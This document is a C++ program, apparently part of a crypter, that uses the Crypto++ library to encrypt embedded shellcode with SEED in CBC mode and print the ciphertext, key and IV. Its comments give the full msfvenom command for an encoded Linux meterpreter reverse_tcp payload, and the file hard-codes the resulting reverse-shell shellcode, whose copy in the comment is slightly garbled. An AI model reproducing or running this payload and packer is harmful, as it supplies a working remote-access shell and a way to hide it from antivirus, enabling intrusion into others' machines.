//////////////////INCLUDE LIBRARY//////////////////////////
#include <iostream>
#include <fstream>
#include "cryptopp/seed.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/base64.h"
///////////////////END OF INCLUDE LIBRARY////////////////////////////

using namespace std;
using namespace CryptoPP;

void Print(const std::string& label, const std::string& val)
{
   std::string encoded;
   StringSource(val, true,
      new HexEncoder(
         new StringSink(encoded)
      ) // HexEncoder
   ); // StringSource

   std::cout << label << ": " << encoded << std::endl;
}

int main(int argc, char* argv[])
{
   AutoSeededRandomPool prng;
   SecByteBlock key(SEED::DEFAULT_KEYLENGTH);
   SecByteBlock iv(SEED::BLOCKSIZE);

   prng.GenerateBlock(key, key.size());
   prng.GenerateBlock(iv, iv.size());
   //generate payload and convert it to shellcode format
   //msfvenom -e  x86/shikata_ga_nai -i 10 -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | hexdump -v -e '"\\\x" 1/1 "%02x"'
//shell code generated "\xb8\xd3\x85\xd7\f4\x7c\xad\xdf\x5e\x4e\x75\x05\xe2\x70\x81\x3a\xbc\x66\x68\xbc\xc4\xf1\x11\x87\x91\xa3\xa0\x95\xf8\x1d\x89\x90\x1a\xee\x1e\x9c\xab\x7b\x10\x91\x6f\x67\x2b\x9b\x02\x07\x9e\xce\xb5\x77\x3c\x8d\x76\xcb\x85\xc6\xfb\x02\xf7\x76\xc6\x50\xa2\x66\x66\x18\x41\xd7\x40\x48\xc8\xd0\x7f\x55\xed\x18\x72\xd5\xcd\x79\x74\x05\xfb\x5b\x4b\x33\x16\xcb\x56\x66\x74\x44\x94\x70\x09\x97\x84\xcb\x56\x3f\x3f\x5b\xe2\xcc\x8e\x67\x40\x7d\x43\x17\xcf\x48\x02\x82\xef\x9f\x5b\x2e\x1e\x44\xfb\x07\x98\xc6\xe8\x7d\xe7\xe5\x95\xd2\xd2\x6b\x17\x45\x32\x86\x09\xb4\xb0\x4c\x56\x63\x0d\x87\x72\xd4\x64\x86\xc4\xec\x41\x78\x45\xe9\xe8\x33\xd7\x4a\x16\xbf\xb7\xd8\x2e\x21\xa7\xff\x01\x33\x8c\x4f\xeb\x54\xd3\x8d\x69\x3e\xe6\xb6\x78\x93\xe6\x35\xa6\x34\x36\x28\x44\x49\xfb\xb4\x51\xf1\x3e\xf1\x73\xc6\xd4\x0f\xf9\x59\x95\x25\xb8\x23\xe6\x7f\x9f\x36\xc0\x0d\x7b\xb7\x8c\x0b\x9d\xfd\xa3\xef\x28\x58\xae\x3e\xc6\xa5\x69\x90\x31\x0e\xff\x26\x5c\xce\x0a\x6e\xda\xf9\x99\x32\x60\x32\x2e\xbc\x7e\xde\x09\x0c\x34\x7d\x1b\xf1\x02\xd6\xae\xc2\x19\x3c\xd8\x1f\xd4\x0a\xd3\xe2\x20\x4b\xed\x80\x0c\x10\xae\xf3\x51\xd5\x70\x8b\xdb\x9c\x59\x76\xe7\xe1\xeb\x33\x46\xca\xd6\x7f\x92\x56\x67\x55\x9e\x7c\x6c\xa9\x77\xa4\xf9\x2f\x44\x9b\xbf\xcf\x73\x64\x4a\x4c\xb9\x76\xa3\xf8\x79\x82\x4f\xad\xff\x9b\x7a\xd5\xd2\x55\x37\xf7\xd8\xdd\x5d\xc7\x04\xec\x93\x19\x52\xd3\x5f\x58\xc5\x6e\xaa\x07\x37\x91\xb2\xc2\x8c\xfe\x56\x68\x23\x9c\xd9\xc4\x18\x97\xe3\xd3\xba\xd2\xa8\xdc\x83"
   string payload="\xb8\xd3\x85\xd7\x61\xda\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x5c\x31\x42\x14\x03\x42\x14\x83\xc2\x04\x31\x70\x0c\xac\x6c\x0f\x97\xdb\xd6\x4b\xa2\x63\x6e\xf4\x7c\xad\xdf\x5e\x4e\x75\x05\xe2\x70\x81\x3a\xbc\x66\x68\xbc\xc4\xf1\x11\x87\x91\xa3\xa0\x95\xf8\x1d\x89\x90\x1a\xee\x1e\x9c\xab\x7b\x10\x91\x6f\x67\x2b\x9b\x02\x07\x9e\xce\xb5\x77\x3c\x8d\x76\xcb\x85\xc6\xfb\x02\xf7\x76\xc6\x50\xa2\x66\x66\x18\x41\xd7\x40\x48\xc8\xd0\x7f\x55\xed\x18\x72\xd5\xcd\x79\x74\x05\xfb\x5b\x4b\x33\x16\xcb\x56\x66\x74\x44\x94\x70\x09\x97\x84\xcb\x56\x3f\x3f\x5b\xe2\xcc\x8e\x67\x40\x7d\x43\x17\xcf\x48\x02\x82\xef\x9f\x5b\x2e\x1e\x44\xfb\x07\x98\xc6\xe8\x7d\xe7\xe5\x95\xd2\xd2\x6b\x17\x45\x32\x86\x09\xb4\xb0\x4c\x56\x63\x0d\x87\x72\xd4\x64\x86\xc4\xec\x41\x78\x45\xe9\xe8\x33\xd7\x4a\x16\xbf\xb7\xd8\x2e\x21\xa7\xff\x01\x33\x8c\x4f\xeb\x54\xd3\x8d\x69\x3e\xe6\xb6\x78\x93\xe6\x35\xa6\x34\x36\x28\x44\x49\xfb\xb4\x51\xf1\x3e\xf1\x73\xc6\xd4\x0f\xf9\x59\x95\x25\xb8\x23\xe6\x7f\x9f\x36\xc0\x0d\x7b\xb7\x8c\x0b\x9d\xfd\xa3\xef\x28\x58\xae\x3e\xc6\xa5\x69\x90\x31\x0e\xff\x26\x5c\xce\x0a\x6e\xda\xf9\x99\x32\x60\x32\x2e\xbc\x7e\xde\x09\x0c\x34\x7d\x1b\xf1\x02\xd6\xae\xc2\x19\x3c\xd8\x1f\xd4\x0a\xd3\xe2\x20\x4b\xed\x80\x0c\x10\xae\xf3\x51\xd5\x70\x8b\xdb\x9c\x59\x76\xe7\xe1\xeb\x33\x46\xca\xd6\x7f\x92\x56\x67\x55\x9e\x7c\x6c\xa9\x77\xa4\xf9\x2f\x44\x9b\xbf\xcf\x73\x64\x4a\x4c\xb9\x76\xa3\xf8\x79\x82\x4f\xad\xff\x9b\x7a\xd5\xd2\x55\x37\xf7\xd8\xdd\x5d\xc7\x04\xec\x93\x19\x52\xd3\x5f\x58\xc5\x6e\xaa\x07\x37\x91\xb2\xc2\x8c\xfe\x56\x68\x23\x9c\xd9\xc4\x18\x97\xe3\xd3\xba\xd2\xa8\xdc\x83";
   
	std::string cipher, encoded, recovered;

   /*********************************\
   \*********************************/

   try
   {
      std::cout << "Payload : " << payload << std::endl;

      CBC_Mode< SEED >::Encryption e;
      e.SetKeyWithIV(key, key.size(), iv);

      // The StreamTransformationFilter adds padding
      //  as required. ECB and CBC Mode must be padded
      //  to the block size of the cipher.
      StringSource s(payload, true, 
         new StreamTransformationFilter(e,
          (new HexEncoder(
		new StringSink(cipher)))
         ) // StreamTransformationFilter
      ); // StringSource
   }
   catch(const CryptoPP::Exception& e)
   {
      std::cerr << e.what() << std::endl;
      exit(1);
   }
	cout<<"Encrypted Payload : "<< cipher<<endl;
 Print("key", std::string((const char*)key.begin(), key.size()));
   Print("iv", std::string((const char*)iv.begin(), iv.size()));
return 0;
}
